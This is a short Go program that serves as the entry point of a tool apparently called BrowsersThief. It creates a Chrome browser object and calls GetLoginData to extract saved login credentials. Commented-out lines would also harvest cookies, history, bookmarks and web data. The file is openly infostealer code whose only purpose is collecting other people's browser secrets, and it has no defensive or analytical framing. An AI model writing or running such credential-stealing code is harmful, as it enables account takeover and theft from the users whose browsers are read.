package main

import (
	"sync"

	_ "github.com/mattn/go-sqlite3"
	"github.com/wywwzjj/BrowsersThief/browsers"
)

func main() {
	wg := &sync.WaitGroup{}

	browserData := []browsers.BrowserData{browsers.NewChrome()}
	for _, browser := range browserData {
		wg.Add(1)
		browser := browser
		go func(wg *sync.WaitGroup) {
			browser.GetLoginData()
			// browser.GetCookies()
			// browser.GetHistory()
			// browser.GetBookmarks()
			// browser.GetWebData()
			wg.Done()
		}(wg)
	}

	wg.Wait()
}
